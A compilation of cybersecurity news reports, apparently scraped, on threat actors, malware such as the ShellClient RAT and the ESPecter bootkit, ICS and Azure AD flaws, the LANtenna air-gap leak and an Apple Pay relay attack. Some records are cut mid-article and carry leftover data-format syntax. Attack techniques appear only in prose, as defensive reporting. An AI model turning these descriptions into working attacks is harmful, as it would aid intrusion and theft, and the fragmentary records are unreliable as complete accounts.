The changes also require app developers to include a link to their privacy policy that explicitly spells out what kinds of data are being gathered, how the collection happens, and how it’s being put to use.\n\nThe development also comes after Apple reintroduced a “Report a Problem“ link to App Store app pages on iOS 15, iPadOS 15, and macOS Monterey, enabling users to report concerns with the downloaded apps in an effort to combat fraud and voice other quality issues. The feature is currently available for users in Australia, Canada, New Zealand, and the U.S., with plans to expand to other regions in the future.\n\n\nFound this article interesting?

{'title': 'Iranian Hackers Abuse Dropbox in Cyberattacks Against Aerospace and Telecom Firms',
'text': 'Details have emerged about a new cyber espionage campaign directed against the aerospace and telecommunications industries, primarily in the Middle East, with the goal of stealing sensitive information about critical assets, organizations’ infrastructure, and technology while remaining in the dark and successfully evading security solutions.\nBoston-based cybersecurity company Cybereason dubbed the attacks “Operation Ghostshell,“ pointing out the use of a previously undocumented and stealthy remote access trojan (RAT) called ShellClient that’s deployed as the main spy tool of choice. The first sign of the attacks was observed in July 2021 against a handpicked set of victims, indicating a highly targeted approach.\n“The ShellClient RAT has been under ongoing development since at least 2018, with several iterations that introduced new functionalities, while it evaded antivirus tools and managed to remain undetected and publicly unknown,“ researchers Tom Fakterman, Daniel Frank, Chen Erlich, and Assaf Dahan said in a technical deep dive published today.\n\nCybereason traced the roots of this threat back to at least November 6, 2018 — previously operating as a standalone reverse shell before evolving to a sophisticated backdoor — highlighting that the malware has been under continuous development with new features and capabilities added by its authors. What’s more, the adversary behind the attacks is also said to have deployed an unknown executable named “lsa.exe“ to perform credential dumping.\nInvestigation into the attribution of the cyber-attacks has also yielded an entirely new Iranian threat actor named MalKamak that has been operating since around the same time period and has eluded discovery and analysis thus far, with possible connections to other Iranian state-sponsored APT threat actors such as Chafer APT (aka APT39) and Agrius APT, the latter of which was found posing as ransomware operators in an effort to conceal the origin of a series of data-wiping hacks against Israeli entities.\n\nBesides carrying out reconnaissance and the exfiltration of sensitive data, ShellClient is engineered as a modular portable executable that’s capable of performing fingerprinting and registry operations. Also of note is the RAT’s abuse of cloud storage services such as Dropbox for command-and-control (C2) communications in an attempt to stay under the radar by blending in with legitimate network traffic originating from the compromised systems.\n\nThe Dropbox storage contains three folders, each storing information about the infected machines, the commands to be executed by the ShellClient RAT, and the results of those commands. “Every two seconds, the victim machine checks the commands folder, retrieves files that represent commands, parses their content, then deletes them from the remote folder and enables them for execution,“ the researchers said.\nThe aforementioned modus operandi mirrors a tactic adopted by another threat actor called IndigoZebra, which was uncovered as relying on Dropbox API to store commands in a victim-specific sub-folder that’s retrieved by the malware prior to execution.\nThe findings also arrive days after a new advanced persistent threat dubbed “ChamelGang“ was identified as behind a string of attacks targeting fuel, energy, and aviation production industries in Russia, the U.S., India, Nepal, Taiwan, and Japan with the goal of stealing data from compromised networks.\n\n\nFound this article interesting?

'text': 'The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday released an advisory regarding multiple security vulnerabilities affecting all versions of Honeywell Experion Process Knowledge System C200, C200E, C300, and ACE controllers that could be exploited to achieve remote code execution and denial-of-service (DoS) conditions.\n“A Control Component Library (CCL) may be modified by a bad actor and loaded to a controller such that malicious code is executed by the controller,“ Honeywell noted in an independent security notification published earlier this February. Credited with discovering and reporting the flaws are Rei Henigman and Nadav Erez of industrial cybersecurity firm Claroty.\n\nExperion Process Knowledge System (PKS) is a distributed control system (DCS) that’s designed to control large industrial processes spanning a variety of sectors ranging from petrochemical refineries to nuclear power plants where high reliability and security is important.\n\nThe list of three flaws is as follows -\nCVE-2021-38397 (CVSS score: 10.0) - Unrestricted Upload of File with Dangerous TypeCVE-2021-38395 (CVSS score: 9.1) - Improper Neutralization of Special Elements in Output Used by a Downstream ComponentCVE-2021-38399 (CVSS score: 7.5) - Relative Path Traversal\nAccording to Claroty, the issues hinge on the download code procedure that’s essential to program the logic running in the controller, thus enabling an attacker to mimic the process and upload arbitrary CLL binary files. “The device then loads the executables without performing checks or sanitization, giving an attacker the ability to upload executables and run unauthorized native code remotely without authentication,“ researchers Henigman and Erez said.\n\nIn a nutshell, successful exploitation of the shortcomings could permit a malicious party to access unauthorized files and directories, and worse, remotely execute arbitrary code and cause a denial-of-service condition. To prevent loading a modified CCL with malicious code to a controller, Honeywell has incorporated additional security enhancements by cryptographically signing each CCL binary that’s validated prior to its use.\nUsers are urged to update or patch as soon as possible in order to mitigate these vulnerabilities fully.\n\n\nFound this article interesting?

{'title': 'Researchers Discover UEFI Bootkit Targeting Windows Computers Since 2012',
'text': 'Cybersecurity researchers on Tuesday revealed details of a previously undocumented UEFI (Unified Extensible Firmware Interface) bootkit that has been put to use by threat actors to backdoor Windows systems as early as 2012 by modifying a legitimate Windows Boot Manager binary to achieve persistence, once again demonstrating how technology meant to secure the environment prior to loading the operating system is increasingly becoming a “tempting target.“\nSlovak cybersecurity firm ESET codenamed the new malware “ESPecter“ for its ability to persist on the EFI System Partition (ESP), in addition to circumventing Microsoft Windows Driver Signature Enforcement to load its own unsigned driver that can be used to facilitate espionage activities such as document theft, keylogging, and screen monitoring by periodically capturing screenshots. The intrusion route of the malware remains unknown as yet.\n\n“ESPecter shows that threat actors are relying not only on UEFI firmware implants when it comes to pre-OS persistence and, despite the existing security mechanisms like UEFI Secure Boot, invest their time into creating malware that would be easily blocked by such mechanisms, if enabled and configured correctly,“ ESET researchers Martin Smolár and Anton Cherepanov said in a technical write-up published Tuesday.\nESPecter’s roots can be traced back to at least 2012, originating as a bootkit for systems with legacy BIOSes, with its authors continuously adding support for new Windows OS versions while barely making any changes to the malware’s modules. The biggest change arrived in 2020 when “those behind ESPecter apparently decided to move their malware from legacy BIOS systems to modern UEFI systems.“\nThe development marks the fourth time real-world cases of UEFI malware have been discovered so far, following LoJax, MosaicRegressor, and most recently FinFisher, the last of which was found leveraging the same method of compromise to persist on the ESP in the form of a patched Windows Boot Manager.\n\n“By patching the Windows Boot Manager, attackers achieve execution in the early stages of the system boot process, before the operating system is fully loaded,“ the researchers said. “This allows ESPecter to bypass Windows Driver Signature Enforcement (DSE) in order to execute its own unsigned driver at system startup.“\nHowever, on systems that support Legacy BIOS Boot Mode, ESPecter gains persistence by altering the master boot record (MBR) code located in the first physical sector of the disk drive to interfere with the loading of the boot manager and load the malicious kernel driver, which is designed to load additional user-mode payloads and set up the keylogger, before erasing its own traces from the machine.\n\nRegardless of the MBR or UEFI variant used, the deployment of the driver leads to the injection of next-stage user-mode components into specific system processes to establish communications with a remote server, thereby enabling an attacker to commandeer the compromised machine and take over control, not to mention download and execute more malware or commands fetched from the server.\nESET did not attribute the bootkit to a particular nation-state or hacking group, but the use of Chinese debug messages in the user-mode client payload has raised the possibility that it could be the work of an unknown Chinese-speaking threat actor.\n“Even though Secure Boot stands in the way of executing untrusted UEFI binaries from the ESP, over the last few years we have been witness to various UEFI firmware vulnerabilities affecting thousands of devices that allow disabling or bypassing Secure Boot,“ the researchers noted. “This shows that securing UEFI firmware is a challenging task and that the way various vendors apply security policies and use UEFI services is not always ideal.“\n\n\nFound this article interesting?

{'title': 'New Study Links Seemingly Disparate Malware Attacks to Chinese Hackers',
'text': 'Chinese cyber espionage group APT41 has been linked to seemingly disparate malware campaigns, according to fresh research that has mapped together additional parts of the group’s network infrastructure to hit upon a state-sponsored campaign that takes advantage of COVID-themed phishing lures to target victims in India. \n“The image we uncovered was that of a state-sponsored campaign that plays on people’s hopes for a swift end to the pandemic as a lure to entrap its victims,“ the BlackBerry Research and Intelligence team said in a report shared with The Hacker News. “And once on a user’s machine, the threat blends into the digital woodwork by using its own customized profile to hide its network traffic.“\nAPT41 (aka Barium or Winnti) is a moniker assigned to a prolific Chinese cyber threat group that carries out state-sponsored espionage activity in conjunction with financially motivated operations for personal gain as far back as 2012. Calling the group “Double Dragon“ for its twin objectives, Mandiant (formerly FireEye) pointed out the collective’s penchant for striking healthcare, high-tech, and telecommunications sectors for establishing long-term access and facilitating the theft of intellectual property.\n\nIn addition, the group is known for staging cybercrime intrusions that are aimed at stealing source code and digital certificates, virtual currency manipulation, and deploying ransomware, as well as executing software supply chain compromises by injecting malicious code into legitimate files prior to distribution of software updates.\nThe latest research by BlackBerry builds on previous findings by Mandiant in March 2020, which detailed a “global intrusion campaign“ unleashed by APT41 by exploiting a number of publicly known vulnerabilities affecting Cisco and Citrix devices to drop and execute next-stage payloads that were subsequently used to download a Cobalt Strike Beacon loader on compromised systems. The loader was notable for its use of a malleable command-and-control (C2) profile that allowed the Beacon to blend its network communications with a remote server into legitimate traffic originating from the victim network.\nBlackBerry, which found a similar C2 profile uploaded to GitHub on March 29 by a Chinese security researcher with the pseudonym “1135,“ used the metadata configuration information to identify a fresh cluster of domains related to APT41 that attempt to masquerade Beacon traffic look like legitimate traffic from Microsoft sites, with IP address and domain name overlaps found in campaigns linked to the Higaisa APT group and that of Winnti disclosed over the past year.\n\nA follow-on investigation into the URLs revealed as many as three malicious PDF files that reached out to one of the newly discovered domains that had also previously hosted a Cobalt Strike Team Server. The documents, likely used along phishing emails as an initial infection vector, claimed to be COVID-19 advisories issued by the government of India or contain information regarding the latest income tax legislation targeting non-resident Indians.\nThe spear-phishing attachments appear in the form of .LNK files or .ZIP archives, which, when opened, result in the PDF document being displayed to the victim, while, in the background, the infection chain leads to the execution of a Cobalt Strike Beacon. Although a set of intrusions using similar phishing lures and uncovered in September 2020 were pinned on the Evilnum group, BlackBerry said the compromise indicators point to an APT41-affiliated campaign.\n“With the resources of a nation-state level threat group, it’s possible to create a truly staggering level of diversity in their infrastructure,“ the researchers said, adding by piecing together the malicious activities of the threat actor via public sharing of information, it’s possible to “uncover the tracks that the cybercriminals involved worked so hard to hide.“\n\n\nFound this article interesting?

'text': 'A newly discovered data exfiltration mechanism employs Ethernet cables as a “transmitting antenna“ to stealthily siphon highly-sensitive data from air-gapped systems, according to the latest research.\n“It’s interesting that the wires that came to protect the air-gap become the vulnerability of the air gap in this attack,“ Dr. Mordechai Guri, the head of R&D in the Cyber Security Research Center in the Ben Gurion University of the Negev in Israel, told The Hacker News.\nDubbed “LANtenna Attack,“ the novel technique enables malicious code in air-gapped computers to amass sensitive data and then encode it over radio waves emanating from Ethernet cables just as if they are antennas. The transmitted signals can then be intercepted by a nearby software-defined radio (SDR) receiver wirelessly, the data decoded, and sent to an attacker who is in an adjacent room.\n“Notably, the malicious code can run in an ordinary user-mode process and successfully operate from within a virtual machine,“ Dr. Guri noted in an accompanying research paper titled “LANTENNA: Exfiltrating Data from Air-Gapped Networks via Ethernet Cables.“\n\nAir-gapped networks are designed as a network security measure to minimize the risk of information leakage and other cyber threats by ensuring that one or more computers are physically isolated from other networks, such as the internet or a local area network. They are usually wired since machines that are part of such networks have their wireless network interfaces permanently disabled or physically removed.\nThis is far from the first time Dr. Guri has demonstrated unconventional ways to leak sensitive data from air-gapped computers. In February 2020, the security researcher devised a method that employs small changes in LCD screen brightness, which remain invisible to the naked eye, to modulate binary information in morse-code-like patterns covertly.\n\nThen in May 2020, Dr. Guri showed how malware could exploit a computer’s power supply unit (PSU) to play sounds and use it as an out-of-band, secondary speaker to leak data in an attack called “POWER-SUPPLaY.“ \nLastly, in December 2020, the researcher showed off “AIR-FI,“ an attack that leverages Wi-Fi signals as a covert channel to exfiltrate confidential information without even requiring the presence of dedicated Wi-Fi hardware on the targeted systems.\n\nThe LANtenna attack is no different in that it works by using the malware in the air-gapped workstation to induce the Ethernet cable to generate electromagnetic emissions in the frequency bands of 125 MHz that are then modulated and intercepted by a nearby radio receiver. In a proof-of-concept demo, data transmitted from an air-gapped computer through its Ethernet cable was received at a distance of 200 cm apart.\nLike other data leakage attacks of this kind, triggering the infection requires the deployment of the malware on the target network via any one of different infection vectors that range from supply chain attacks or contaminated USB drives to social engineering techniques, stolen credentials, or by using malicious insiders.\nAs countermeasures, the researchers propose prohibiting the use of radio receivers in and around air-gapped networks and monitoring the network interface card link layer activity for any covert channel, as well as jamming the signals, and using metal shielding to limit electromagnetic fields from interfering with or emanating from the shielded wires.\n“This paper shows that attackers can exploit the Ethernet cables to exfiltrate data from air-gapped networks,“ the researchers said in the paper. “Malware installed in a secured workstation, laptop, or embedded device can invoke various network activities that generate electromagnetic emissions from Ethernet cables.“\n“Dedicated and expensive antennas yield better distance and could reach tens of meters with some cables,“ Dr. Guri added.\n\n\nFound this article interesting?

It’s also one of the most popular task orchestration tools, followed by Luigi, Kubeflow, and MLflow.\nIt’s worth stressing that the findings from Intezer concern exposed Apache Airflow managed by individuals and organizations, causing a leak of credentials associated with different applications and services, and doesn’t indicate a weakness in the platforms themselves.\n\nSome of the most common insecure coding practices uncovered by Intezer include the use of hard-coded database passwords in Python code for orchestrating workflows as well as in a feature called Variables, plaintext credentials in the “Extra“ field of Connections, and cleartext keys in publicly-accessible configuration files (airflow.cfg).\nChief among the concerns associated with misconfigured Airflow instances is the leakage of credentials, making them ideal candidates for exploitation by threat actors, who can abuse the information to spread laterally and gain access to accounts and databases, thus leading to violation of data protection laws and giving the attackers an insight into the organizations’ tools and packages, which could later be exploited to stage supply-chain attacks.\n\n“If a large number of passwords are visible, a threat actor can also use this data to detect patterns and common words to infer other passwords,“ Intezer researchers said. “These can be leveraged in dictionary or brute-force-style attacks against other platforms.“\nEven more concerning is also the possibility that malware can be launched on the exposed production environments by leveraging the Variables feature to modify the container image variables to point to a different image laced with unauthorized code.\nApache Airflow, for its part, has remediated a lot of security issues with version 2.0.0 that was released in December 2020, making it critical that users of the software update to the latest version and adopt secure coding practices to prevent passwords from being exposed.\n\n\nFound this article interesting?

'text': 'A previously undocumented threat actor has been identified as behind a string of attacks targeting fuel, energy, and aviation production industries in Russia, the U.S., India, Nepal, Taiwan, and Japan with the goal of stealing data from compromised networks.\nCybersecurity company Positive Technologies dubbed the advanced persistent threat (APT) group ChamelGang — referring to their chameleellonic capabilities, including disguising “its malware and network infrastructure under legitimate services of Microsoft, TrendMicro, McAfee, IBM, and Google.“ \n\n“To achieve their goal, the attackers used a trending penetration method—supply chain,“ the researchers said of one of the incidents investigated by the firm. “The group compromised a subsidiary and penetrated the target company’s network through it. Trusted relationship attacks are rare today due to the complexity of their execution. Using this method […], the ChamelGang group was able to achieve its goal and steal data from the compromised network.“\nIntrusions mounted by the adversary are believed to have commenced at the end of March 2021, with later attacks in August leveraging what’s called the ProxyShell chain of vulnerabilities affecting Microsoft Exchange Servers, the technical details of which were first revealed at the Black Hat USA 2021 security conference earlier that month.\n\nThe attack in March is also notable for the fact that the operators breached a subsidiary organization to gain access to an unnamed energy company’s network by exploiting a flaw in Red Hat JBoss Enterprise Application (CVE-2017-12149) to remotely execute commands on the host and deploy malicious payloads that enable the actor to launch the malware with elevated privileges, laterally pivot across the network, and perform reconnaissance, before deploying a backdoor called DoorMe.\n“The infected hosts were controlled by the attackers using the public utility FRP (fast reverse proxy), written in Golang,“ the researchers said. “This utility allows connecting to a reverse proxy server. The attackers’ requests were routed using the socks5 plugin through the server address obtained from the configuration data.“\n\nOn the other hand, the August attack against a Russian company in the aviation production sector involved the exploitation of ProxyShell flaws (CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207) to drop additional web shells and conduct remote reconnaissance on the compromised node, ultimately leading to the installation of a modified version of the DoorMe implant that comes with expanded capabilities to run arbitrary commands and carry out file operations.\n“Targeting the fuel and energy complex and aviation industry in Russia isn’t unique — this sector is one of the three most frequently attacked,“ Positive Technologies’ Head of Threat Analysis, Denis Kuvshinov, said. “However, the consequences are serious: Most often such attacks lead to financial or data loss—in 84% of all cases last year, the attacks were specifically created to steal data, and that causes major financial and reputational damage.“\n\n\nFound this article interesting?

The transactions could also be relayed from an iPhone inside someone’s bag, without their knowledge,“ a group of academics from the University of Birmingham and University of Surrey said. “The attacker needs no assistance from the merchant and backend fraud detection checks have not stopped any of our test payments.“\n\nExpress Travel is a feature that allows users of iPhone and Apple Watch to make quick contactless payments for public transit without having to wake or unlock the device, open an app, or even validate with Face ID, Touch ID or a passcode.\nThe man-in-the-middle (MitM) replay and relay attack, which involves bypassing the lock screen to make a payment to any EMV reader illicitly, is made possible due to a combination of flaws in both Apple Pay and Visa’s system, and doesn’t impact, say, Mastercard on Apple Pay or Visa cards on Samsung Pay.\nThe modus operandi hinges on mimicking a transit gate transaction by using a Proxmark device that acts as an EMV card reader communicating with a victim’s iPhone and an NFC-enabled Android app that functions as a card emulator to relay signals to a payment terminal. \n\nSpecifically, it takes advantage of a unique code — aka Magic Bytes — broadcast by the transit gates to unlock Apple Pay, resulting in a scenario whereby replaying the sequence of bytes, the Apple device is deceived into authorizing a rogue transaction as if it’s originated from the ticket barrier, when, in reality, it’s been triggered via a contactless payment terminal under the attacker’s control.\n\nAt the same time, the EMV reader is also tricked into believing that on-device user authentication has been performed, thus enabling payments of any amount to be made without the iPhone user’s knowledge.\nApple and Visa were alerted to the vulnerability in October 2020 and May 2021, respectively, the researchers said, adding, “both parties acknowledge the seriousness of the vulnerability, but have not come to an agreement on which party should implement a fix.“\nIn a statement shared with the BBC, Visa said this type of attack was “impractical,“ adding, “Variations of contactless fraud schemes have been studied in laboratory settings for more than a decade and have proven to be impractical to execute at scale in the real world.“\n“This is a concern with a Visa system but Visa does not believe this kind of fraud is likely to take place in the real world given the multiple layers of security in place,“ an Apple spokesperson was quoted as saying to the U.K. national broadcaster.\n\n\nFound this article interesting?

'text': 'A formerly unknown Chinese-speaking threat actor has been linked to a long-standing evasive operation aimed at South East Asian targets as far back as July 2020 to deploy a kernel-mode rootkit on compromised Windows systems.\nAttacks mounted by the hacking group, dubbed GhostEmperor by Kaspersky, are also said to have used a “sophisticated multi-stage malware framework“ that allows for providing persistence and remote control over the targeted hosts.\nThe Russian cybersecurity firm called the rootkit Demodex, with infections reported across several high-profile entities in Malaysia, Thailand, Vietnam, and Indonesia, in addition to outliers located in Egypt, Ethiopia, and Afghanistan.\n\n“[Demodex] is used to hide the user mode malware’s artefacts from investigators and security solutions, while demonstrating an interesting undocumented loading scheme involving the kernel mode component of an open-source project named Cheat Engine to bypass the Windows Driver Signature Enforcement mechanism,“ Kaspersky researchers said.\nGhostEmperor infections have been found to leverage multiple intrusion routes that culminate in the execution of malware in memory, chief among them being exploiting known vulnerabilities in public-facing servers such as Apache, Window IIS, Oracle, and Microsoft Exchange — including the ProxyLogon exploits that came to light in March 2021 — to gain an initial foothold and laterally pivot to other parts of the victim’s network, even on machines running recent versions of the Windows 10 operating system.\n\nFollowing a successful breach, select infection chains that resulted in the deployment of the rootkit were carried out remotely via another system in the same network using legitimate software such as WMI or PsExec, leading to the execution of an in-memory implant capable of installing additional payloads during run time.\nNotwithstanding its reliance on obfuscation and other detection-evasion methods to elude discovery and analysis, Demodex gets around Microsoft’s Driver Signature Enforcement mechanism to permit the execution of unsigned, arbitrary code in kernel space by leveraging a legitimate and open-source signed driver named “dbk64.sys“ that’s shipped alongside Cheat Engine, an application used to introduce cheats into video games.\n\n“With a long-standing operation, high profile victims, [and] advanced toolset […] the underlying actor is highly skilled and accomplished in their craft, both of which are evident through the use of a broad set of unusual and sophisticated anti-forensic and anti-analysis techniques,“ the researchers said.\nThe disclosure comes as a China-linked threat actor codenamed TAG-28 has been discovered as being behind intrusions against Indian media and government agencies such as The Times Group, the Unique Identification Authority of India (UIDAI), and the police department of the state of Madhya Pradesh.\nRecorded Future, earlier this week, also unearthed malicious activity targeting a mail server of Roshan, one of Afghanistan’s largest telecommunications providers, that it attributed to four distinct Chinese state-sponsored actors — RedFoxtrot, Calypso APT, as well as two separate clusters using backdoors associated with the Winnti and PlugX groups.\n\n\nFound this article interesting?

'text': 'In yet another indicator of how hacking groups are quick to capitalize on world events and improvise their attack campaigns for maximum impact, threat actors have been discovered impersonating Amnesty International to distribute malware that purports to be security software designed to safeguard against NSO Group’s Pegasus surveillanceware. \n“Adversaries have set up a phony website that looks like Amnesty International’s — a human rights-focused non-governmental organization — and points to a promised antivirus tool to protect against the NSO Group’s Pegasus tool,“ Cisco Talos researchers said. “However, the download actually installs the little-known Sarwent malware.“\n\nThe countries most affected by the campaign include the U.K., the U.S., Russia, India, Ukraine, Czech Republic, Romania, and Colombia. While it’s unclear as to how the victims are lured into visiting the fake Amnesty International website, the cybersecurity firm surmised the attacks could be aimed at users who may be specifically searching for protection against this threat.\nThe development comes on the heels of an explosive investigation in July 2021 that revealed widespread abuse of the Israeli company’s Pegasus “military-grade spyware“ to facilitate human rights violations by surveilling heads of state, activists, journalists, and lawyers around the world. The NGO has since also released a Mobile Verification Toolkit (MVT) to help individuals scan their iPhone and Android devices for evidence of compromise.\n\nBesides making use of social engineering tricks by designing a rogue website with an identical look and feel of Amnesty International’s legitimate online portal, the modus operandi aims to trick the visitor into downloading an “Amnesty Anti Pegasus Software“ under the guise of an antivirus tool that features capabilities to enable the bad actor find way a remote way into the compromised machine and exfiltrate sensitive information, such as login credentials.\n\nThe Sarwent sample used in the low-volume campaign is a highly-customized variant coded in Delphi and is capable of allowing remote desktop access through VNC or RDP and executing command line or PowerShell instructions received from an attacker-controlled domain, the results of which are sent back to the server.\n\nTalos attributed the infections with high confidence to a Russian-speaking actor locating in the country and known for mounting attacks involving the Sarwent backdoor since at least January 2021 sprawling across a variety of victims, noting the level of modifications made to the supposed antivirus as likely evidence that “the operator has access to the source code of the Sarwent malware.“\n“The campaign targets people who might be concerned that they are targeted by the Pegasus spyware,“ the researchers said. “This targeting raises issues of possible state involvement, but there is insufficient information […] to make any determination on which state or nation. It is possible that this is simply a financially motivated actor looking to leverage headlines to gain new access.“\n\n\nFound this article interesting?

{'title': 'New Azure AD Bug Lets Hackers Brute-Force Passwords Without Getting Caught',
'text': 'Cybersecurity researchers have disclosed an unpatched security vulnerability in the protocol used by Microsoft Azure Active Directory that potential adversaries could abuse to stage undetected brute-force attacks.\n“This flaw allows threat actors to perform single-factor brute-force attacks against Azure Active Directory (Azure AD) without generating sign-in events in the targeted organization’s tenant,“ researchers from Secureworks Counter Threat Unit (CTU) said in a report published on Wednesday.\n\nAzure Active Directory is Microsoft’s enterprise cloud-based identity and access management (IAM) solution designed for single sign-on (SSO) and multi-factor authentication. It’s also a core component of Microsoft 365 (formerly Office 365), with capabilities to provide authentication to other applications via OAuth.\nThe weakness resides in the Seamless Single Sign-On feature that allows employees to automatically sign in when using their corporate devices that are connected to enterprise networks without having to enter any password. Seamless SSO is also an “opportunistic feature“ in that if the process fails, the login falls back to the default behavior, wherein the user needs to enter their password on the sign-in page. \n\nTo achieve this, the mechanism relies on the Kerberos protocol to look up the corresponding user object in Azure AD and issue a ticket-granting ticket (TGT), permitting the user to access the resource in question. But for users of Exchange Online with Office clients older than the Office 2013 May 2015 update, the authentication is carried through a password-based endpoint called “UserNameMixed“ that either generates an access token or an error code depending on whether the credentials are valid.\n\nIt’s these error codes where the flaw stems from. While successful authentication events create sign-ins logs upon sending the access tokens, “Autologon’s authentication to Azure AD is not logged,“ allowing the omission to be leveraged for undetected brute-force attacks through the UserNameMixed endpoint.\nSecureworks said it notified Microsoft of the issue on June 29, only for Microsoft to acknowledge the behavior on July 21 as “by design.“ When reached by The Hacker News, the company said “We’ve reviewed these claims and determined the technique described does not involve a security vulnerability and protections are in place to help ensure customers remain safe and secure.“\nMicrosoft also clarified the safeguards against brute-force attacks already apply to the aforementioned endpoints, and that the tokens issued by the UserNameMixed API do not provide access to data, adding they need to be presented back to Azure AD to obtain the actual tokens. Such requests for access tokens are protected by Conditional Access, Azure AD Multi-Factor Authentication, Azure AD Identity Protection, and surfaced in sign-in logs, the company noted.\n\n\nFound this article interesting?

{'title': 'Incentivizing Developers is the Key to Better Security Practices',
'text': 'Professional developers want to embrace DevSecOps and write secure code, but their organizations need to support this seachange if they want that effort to grow.\nThe cyber threat landscape is becoming more complex by the day. Attackers are constantly scanning networks for vulnerable applications, programs, cloud instances, and the latest flavor of the month is APIs, widely considered an easy win thanks to their often lax security controls.\nThey are so persistent that new apps can sometimes be compromised and exploited within hours of deployment. The Verizon 2021 Data Breach Investigations Report makes it very clear that the threats leveled against businesses and organizations are more dangerous today than at any other point in history.\nIt’s becoming very clear that the only way to truly fortify the software being created is to ensure that it’s built on secure code. In other words, the best way to stop the threat actor invasion is to deny them a foothold into your applications in the first place. Once you start fighting that war, most of the advantages are skewed towards the attackers.\nThis situation first gave rise to agile development and DevOps, and later to the entire DevSecOps movement, where security is a shared responsibility for everyone involved in the process of creating software from development to deployment. But the base of that pyramid, and arguably the most important part, are the developers. While most developers want to do their part and write secure code, many of the organizations they work for are less supportive of the changes such a major shift in priorities requires. \nDefeat by Design\nFor many years, developers were told that their primary role at their organizations was to quickly build and deploy apps in a fast-paced environment, where business never stops and customers never sleep. The faster that developers could code and the more features they could deploy, the more valuable they were seen in terms of their performance reviews.\nSecurity was an afterthought, if it was considered at all. Instead, all of that was left to the application security (AppSec) teams to figure out. AppSec teams were disliked by most developers because they would often send completed applications back into development to apply security patches or to rewrite code to remediate vulnerabilities. And every hour that a developer spent working on an app that was already “finished“ was an hour they were not creating new apps and features, thus decreasing their performance (and their value, in the eyes of a particularly punitive company).\nAnd then the threat environment changed the importance and prioritization of security for most companies. According to the recent Cost of a Data Breach Report from IBM and the Ponemon Institute, the average cybersecurity breach now costs about $3.8 million per incident, although that is hardly the upper limit. One company alone incurred $1.3 billion in losses following a breach on their network. The companies of today want the security offered by DevSecOps, but, sadly, have been slow to reward developers who answer that call.\nSimply telling the development teams to consider security won’t work, especially if they are still being incentivized based on speed alone. In fact, within such a system, developers who take the time to learn about security and secure their code could actually be losing out on better performance reviews and lucrative bonuses that their less-security-aware colleagues continue to earn. It’s almost like companies are unwittingly rigging the system for their own security failures, and it comes back to their perception of the development team. If they’re not seeing them as the security frontlines, then it’s very unlikely a viable plan to utilize their workforce will come to fruition.\nAnd this doesn’t even account for the lack of training. Some very skilled developers have decades of experience coding, but very little when it comes to security… after all, it was never required of them. Unless a company provides a good training program to its skilled programmers, it can hardly expect its developers to suddenly gain new skills and put them into action in a meaningful way that actively reduces vulnerabilities.\n(Are you already security-confident and want to compete against other secure coding all-stars? Join Secure Code Warrior’s Devlympics 2021, our biggest and best global security tournament, and you could win big!)\nRewarding Developers for Good Security Practices\nThe good news is that the overwhelming majority of developers do their job because they find it both challenging and rewarding, and because they enjoy the respect that their position entails.\nLifelong professional coder Michael Shpilt recently wrote about all of the things that motivate him and his coding colleagues in their development work. Yes, he lists monetary compensation among those incentives, but it’s surprisingly far down the list. Instead, he prioritizes the thrill of creating something new, learning new skills and the satisfaction of knowing that his work is going to be directly used to help others. He also talks about wanting to feel valued within his company and community. In short, developers are like a lot of good people who take pride in their work.\nDevelopers like Shpilt and others don’t want threat actors compromising their code and using it to harm their company, or the very users they are trying to help. But, they can’t suddenly shift their priorities to security without support. Otherwise, It’s almost like the system will be working against them.\nTo help development teams improve their cybersecurity prowess, they must first be taught the necessary skills. Utilizing scaffolded learning, and tools like Just-in-Time (JiT) training can make this process much less painful, and helps to build upon existing knowledge in the right context. \nThe principle of JiT is that developers are served the right knowledge at just the right time, for example, if a JiT developer training tool detects that a programmer is creating an insecure piece of code, or is accidentally introducing a vulnerability into their application, it can activate and show the developer how they could fix that problem, and how to write more secure code to perform that same function in the future.\nWith a commitment to upskilling in place, the old methods of evaluating developers based solely on speed need to be eliminated. Instead, coders should be rewarded based on their ability to create secure code, with the best developers becoming security champions that help the rest of the team improve their skills. And those champions need to be rewarded with both company prestige and monetary compensation. It’s also important to remember that developers don’t typically have a positive experience with security, and uplifting them with positive, fun learning and incentives that speak to their interests will go a long way to ensuring both knowledge retention and a desire to keep building skills.\nCompanies can still include coding speed as one part of a developer’s evaluation, but with the expectation that developing secure applications might take a little longer, especially as coders are learning those new skills.\nDevSecOps can be the ultimate defense against the dark arts of an increasingly dangerous threat landscape. Just don’t forget that the champions of this new world, the developers who are consistently creating new code, need to be respected and compensated for their work.\nWant to put your security skills to the test against other developers all over the world?

'text': 'The IDC cloud security survey 2021 states that as many as 98% of companies were victims of a cloud data breach within the past 18 months.\nFostered by the pandemic, small and large organizations from all over the world are migrating their data and infrastructure into a public cloud, while often underestimating novel and cloud-specific security or privacy issues. \nNearly every morning, the headlines are full of sensational news about tens of millions of health or financial records being found in unprotected cloud storage like AWS S3 buckets, Microsoft Azure blobs or another cloud-native storage service by the growing number of smaller cloud security providers. \nImmuniWeb, a rapidly growing application security vendor that offers a variety of AI-driven products, has announced this week that its free Community Edition, running over 150,000 daily security tests, now has one more online tool – cloud security test.\nTo check your unprotected cloud storage, you just need to enter your main website URL and wait a few minutes:\n\nImmuniWeb says that the free test detects cloud storage from 19 cloud service providers, including AWS, Azure and GCP. You can see in the results the region or country your cloud data is stored for the purpose of compliance with GDPR or other national privacy laws and regulations. \nAccording to ImmuniWeb, the technology behind the test leverages OSINT, big data and smart prediction technology based on Machine Learning to discover unprotected cloud buckets belonging to your company. \nTo prevent using its new tool for potentially malicious purposes, free registration and account validation are required to gather the URLs of your exposed cloud buckets. The tool is also equipped with a free API available after registration for DevOps and cybersecurity teams. \nAn awesome differentiator of ImmuniWeb’s cloud security test is that you don’t need to enter your cloud credentials, contrasted to most open-sourced or commercial cloud monitoring tools that require IAM credentials to enumerate your cloud assets and instances. Another feature that we liked is coverage of medium-sized cloud service providers, such as Oracle Cloud or IBM Cloud.\nMoreover, many regional players like SberCloud from Russia or Chinese Alibaba Cloud are also on the radar, helping organizations to detect regional cloud presence or shadow cloud accounts:\n\nImmuniWeb also provides a paid version of all-in-one Attack Surface Management (ASM) and Dark Web Monitoring solution ImmuniWeb Discovery. ImmuniWeb claims that Discovery detects considerably more external cloud assets, encompassing cloud-based load balancers, databases, repositories, container management and orchestration software being exposed to the Internet. The on-premises and cloud-based IT assets are then correlated with the Dark Web findings to provide a threat-aware risk scoring to the customers who may also use Discovery to assess their suppliers and prevent supply chain attacks. \nCloud ASM has become an extremely hot topic in 2021 